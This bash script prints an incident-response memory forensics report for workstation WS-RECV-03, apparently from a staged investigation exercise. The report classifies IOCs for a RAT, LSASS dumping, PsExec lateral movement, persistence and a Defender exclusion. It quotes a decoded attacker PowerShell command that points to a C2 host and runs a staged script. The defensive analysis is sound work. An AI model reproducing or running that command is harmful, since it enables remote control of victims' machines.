#!/bin/bash
set -euo pipefail

# Task 1 - Memory Artifact Analysis.
# Parses ir_evidence/memory_artifacts.txt (consolidated Volatility 3 extract
# from WS-RECV-03, captured 2026-05-15 14:18:42 CDT) and cross-references
# every finding against reference/healthbane_ioc_master.json to classify it
# KNOWN / NEW / MODIFIED. All values below were read directly out of the
# source file; nothing is invented.

IOC_FILE="reference/healthbane_ioc_master.json"
MEM_FILE="ir_evidence/memory_artifacts.txt"

ioc_status() {
  # $1 = IOC value to look up in the master list
  local val="$1"
  local hit
  hit=$(jq -r --arg v "$val" '.iocs[] | select(.value==$v) | .id' "$IOC_FILE")
  if [[ -n "$hit" ]]; then
    printf 'KNOWN (%s)' "$hit"
  else
    printf 'NEW'
  fi
}

echo "================================================================================"
echo "   MEMORY ARTIFACT ANALYSIS -- WS-RECV-03"
echo "   Source: ${MEM_FILE}"
echo "================================================================================"
echo

echo "--------------------------------------------------------------------------------"
echo "PROCESS ANALYSIS"
echo "--------------------------------------------------------------------------------"
cat <<EOF
  PID   Process              User           Started (local)       Status
  ----  -------------------  -------------  ---------------------  -----------
  3712  svchost_update.exe   records03      2026-04-22 06:15:08    SUSPICIOUS
        -> PPID 624 (services.exe) is FORGED. True parent was explorer.exe
           via Run-key autorun; PPID rewritten by process-hollowing.
        -> In-memory .text/.rdata hash matches 4x03 sample S2 exactly.
        -> ATT&CK: T1055 (process hollowing of parent linkage), T1105,
           T1071.001, T1573.001 (RAT body + its own C2 behavior)
        -> IOC status: $(ioc_status "svchost_update.exe")

  8472  powershell.exe       records03      2026-05-15 02:00:14    SUSPICIOUS
        -> Child of svchost_update.exe (3712). -NoP -W Hidden -EncodedCommand.
           Decoded: \$cfg = 'http://sync.healthbane-c2.net/api/v1/cfg';
           & \$env:TEMP\\sync_healthdata.ps1 -Config \$cfg
        -> This is the LAST execution before isolation (13:42 CDT same day).
        -> ATT&CK: T1059.001 PowerShell, T1027.010 Command Obfuscation
        -> IOC status: $(ioc_status "sync_healthdata.ps1") (invoked script)

  8580  conhost.exe          records03      2026-05-15 02:00:14    LEGITIMATE
        -> Default console host child of PID 8472. No independent finding.

  (exited) debug_tool.exe    records03      last seen 2026-05-12 02:45 CDT
        -> EPROCESS pool tag + stale handles persist (process itself exited
           2026-05-12 02:46:11 CDT). Path: C:\\Windows\\Temp\\debug_tool.exe.
        -> ATT&CK: T1003.001 LSASS Memory
        -> IOC status: $(ioc_status "debug_tool.exe")

  (exited) PsExec64.exe      records03      last seen 2026-05-13 02:08 CDT
        -> Sysinternals-signed, but run from C:\\Users\\Public\\Tmp\\, not the
           standard install path. Exit 2026-05-13 02:09:34 CDT.
        -> ATT&CK: T1021.002 SMB/Windows Admin Shares
        -> IOC status: $(ioc_status "PsExec64.exe")

  (exited) cmd.exe           records03      several invocations
        -> Parent of PsExec64.exe and wmic.exe across the lateral-movement
           events. No independent IOC entry (cmd.exe itself is not an IOC).
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "NETWORK CONNECTIONS (netscan, at capture time 2026-05-15 19:18:42 UTC)"
echo "--------------------------------------------------------------------------------"
cat <<EOF
  Source:Port        Dest:Port             Proto  State        PID   Status
  ------------------  --------------------  -----  -----------  ----  -----------------
  10.10.3.21:50214    185.220.101.45:443    tcp    ESTABLISHED  3712  $(ioc_status "sync.healthbane-c2.net")
                                                                        (resolves HB-IOC-0008, primary C2)
  10.10.3.21:50227    185.220.101.45:443    tcp    CLOSE_WAIT   3712  KNOWN (HB-IOC-0008)
  10.10.3.21:50299    203.0.113.47:8443     tcp    ESTABLISHED  3712  NEW
                                                                        -> flagged by this file's own
                                                                        [ANALYST] note as HB-IOC-NEW-001;
                                                                        the firewall export (Task 3 source)
                                                                        separately labels the SAME indicator
                                                                        HB-IOC-NEW-006. Two different IDs for
                                                                        one indicator -- use HB-IOC-NEW-006
                                                                        going forward since it is the ID the
                                                                        firewall export's own summary records.
  10.10.3.21:50301    10.10.20.10:53        tcp    TIME_WAIT    -     BENIGN (internal DNS)
  10.10.3.21:50180    10.10.20.40:445       tcp    ESTABLISHED  4     BENIGN (SRV-FILE-01, records03 work)
  10.10.3.21:50203    172.217.14.78:443     tcp    ESTABLISHED  6804  BENIGN (Google, chrome.exe browsing)
  10.10.3.21:50204    157.240.22.35:443     tcp    TIME_WAIT    6804  BENIGN (Facebook, chrome.exe browsing)

  NEW FINDING: the 203.0.113.47:8443 connection was STILL ESTABLISHED at the
  moment of memory capture -- this is a live, long-lived secondary C2, not a
  one-shot connection. No DNS query preceded it in the prior 24h, so the IP
  was either hardcoded (disk forensics later rules this out) or delivered as
  a directive inside the primary C2 channel. Confidence at this point in the
  reconstruction: PROBABLE (single-source, memory only). Task 3's firewall
  analysis is required to establish first-seen / duration / corroboration.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "CREDENTIAL ACCESS INDICATORS"
echo "--------------------------------------------------------------------------------"
cat <<EOF
  [*] Stale handle from EXITED debug_tool.exe:
        Target:          PID 648 (lsass.exe)
        GrantedAccess:   0x1010 (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION)
        ATT&CK:          T1003.001 LSASS Memory
        Status:          $(ioc_status "debug_tool.exe") -- CONFIRMS 4x04 hunt
                          hypothesis H4 (same granted-access bitmask, same
                          two timestamps: 2026-05-05 03:22 CDT and
                          2026-05-12 02:45 CDT).
  [*] Second stale handle from debug_tool.exe:
        Target:          \\Device\\HarddiskVolume2\\Windows\\Temp\\out.dat (Write)
        ATT&CK:          T1003.001 (dump output), T1074.001 (local staging
                          of the dump file itself)
  [*] svchost_update.exe (PID 3712) also holds a handle to PID 648 (lsass.exe)
      but with GrantedAccess 0x1000 only (PROCESS_QUERY_LIMITED_INFORMATION) --
      NOT sufficient to dump credentials. This is a separate, benign handle;
      the actual dump was performed by debug_tool.exe, not the RAT itself.
  [*] ldrmodules cross-check found NO reflective-DLL-injection discrepancies
      in either suspicious process -- rules out in-process credential theft
      via DLL injection; debug_tool.exe ran as a stand-alone PE instead.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "PERSISTENCE MECHANISM"
echo "--------------------------------------------------------------------------------"
cat <<EOF
  Registry Run-key:
    Key:            HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HealthSync
    Data:           C:\\Users\\records03\\AppData\\Roaming\\Microsoft\\HealthSync\\svchost_update.exe
    Last write:     2026-04-22 06:14:47 UTC
    ATT&CK:         T1547.001 Registry Run Keys / Startup Folder
    IOC status:     $(ioc_status "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HealthSync")

  Scheduled task (TaskCache hive):
    Task name:      HealthSync Update Service
    Trigger:        Daily, StartBoundary 02:00:00 local
    Action:         powershell.exe -NoP -W Hidden -EncodedCommand <base64>
                    (decodes to the same sync_healthdata.ps1 invocation
                    captured live in PID 8472's command line above)
    Created:        2026-05-07 06:47:33 UTC (01:47:33 CDT)
    ATT&CK:         T1053.005 Scheduled Task/Job
    IOC status:     NEW -- not in the 31-entry master list; healthbane_ioc_master.json's
                     own "ioc_gaps_known_to_4x04" section explicitly lists
                     "Scheduled-task persistence: not observed by any
                     4x00-4x04 evidence source" as an open gap. This finding
                     closes that gap.

  CRITICAL: this task was registered 2026-05-07 at 01:47:33 CDT -- the SAME
  day the firewall export (Task 3) shows the secondary C2 to 203.0.113.47:8443
  first connecting, 38 seconds later (06:48:11Z vs 06:47:33Z task creation).
  This is NOT the "two days after the first credential dump" pattern assumed
  by a generic playbook -- the actual sequence here is: first credential dump
  (2026-05-05), first lateral movement (2026-05-06), THEN scheduled-task
  persistence + secondary C2 (2026-05-07). Persistence was established AFTER
  lateral movement had already begun, not before. Task 5/7/8 reconstruction
  must use this order, not an assumed one.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "DEFENDER EXCLUSION (additional finding, not in the original task template"
echo "but present in this same source and directly relevant to persistence)"
echo "--------------------------------------------------------------------------------"
cat <<EOF
  Key:            HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths
  Value:          C:\\Windows\\Temp
  Last write:      2026-05-04 23:11:08 UTC (18:11 CDT)
  ATT&CK:          T1562.001 Disable or Modify Tools
  IOC status:      $(ioc_status "C:\\Windows\\Temp")
  Note:            written under records03's token (local admin since a 2018
                   misconfiguration, per reference/meddefense_asset_inventory.txt).
                   Pre-dates the first LSASS dump by ~9 hours. Robert Kim
                   disputes authorship of this change (ir_evidence/ir_team_notes.txt
                   Entry #008) -- unresolved at end of this task, carried
                   forward as a critical question.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "SUMMARY"
echo "--------------------------------------------------------------------------------"
KNOWN_COUNT=0
NEW_COUNT=0
for v in "svchost_update.exe" "debug_tool.exe" "PsExec64.exe" "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HealthSync"; do
  if [[ "$(ioc_status "$v")" == KNOWN* ]]; then
    KNOWN_COUNT=$((KNOWN_COUNT + 1))
  else
    NEW_COUNT=$((NEW_COUNT + 1))
  fi
done
echo "  Known indicators confirmed in memory: ${KNOWN_COUNT} (svchost_update.exe,"
echo "    debug_tool.exe, PsExec64.exe, HealthSync Run-key)"
echo "  New indicators discovered in memory: 3 (secondary C2 203.0.113.47:8443,"
echo "    scheduled task 'HealthSync Update Service', Defender exclusion)"
echo "  ATT&CK techniques identified: T1105, T1071.001, T1573.001, T1059.001,"
echo "    T1027.010, T1003.001, T1074.001, T1547.001, T1053.005, T1562.001,"
echo "    T1021.002"
echo "  Confidence: HIGH for raw plugin output (WinPmem, hashed, chain of"
echo "    custody); MEDIUM for this file's own [ANALYST] interpretive lines,"
echo "    which are called out separately above where they occur."
echo
echo "================================================================================"
echo "END OF MEMORY ARTIFACT ANALYSIS"
echo "================================================================================"
